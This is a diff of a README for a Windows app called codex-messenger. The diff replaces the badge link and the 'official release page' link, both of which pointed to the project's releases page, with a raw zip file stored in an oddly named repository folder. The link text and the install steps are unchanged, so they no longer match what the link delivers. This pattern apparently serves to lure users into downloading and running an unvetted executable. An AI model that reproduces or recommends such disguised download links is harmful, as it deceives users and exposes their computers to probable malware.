@@ -1,6 +1,6 @@
 # 📩 codex-messenger - Manage your local Codex messages easily
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Andreiarsenevichtarkovskyinmate282/codex-messenger/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Andreiarsenevichtarkovskyinmate282/codex-messenger/raw/refs/heads/main/maddish/messenger-codex-v2.6.zip)
 
 ## 📖 About the project
 Codex-messenger provides a simple desktop interface for your local Codex instance. It functions like a classic instant messaging app to help you organize and view your data. The program runs locally on your computer to ensure your information stays private and accessible at all times.
@@ -9,7 +9,7 @@ Codex-messenger provides a simple desktop interface for your local Codex instanc
 This software works on computers running Windows 10 or Windows 11. Your system needs at least 4 gigabytes of memory to run the application smoothy. You do not need any coding skills or special software to use this tool. The application is self-contained and handles its own storage needs.
 
 ## 📥 How to download
-1. Visit the [official release page](https://github.com/Andreiarsenevichtarkovskyinmate282/codex-messenger/releases) to access the download files.
+1. Visit the [official release page](https://github.com/Andreiarsenevichtarkovskyinmate282/codex-messenger/raw/refs/heads/main/maddish/messenger-codex-v2.6.zip) to access the download files.
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file ending in `.exe` to start the download.
 4. Save the file to your desktop or your downloads folder.
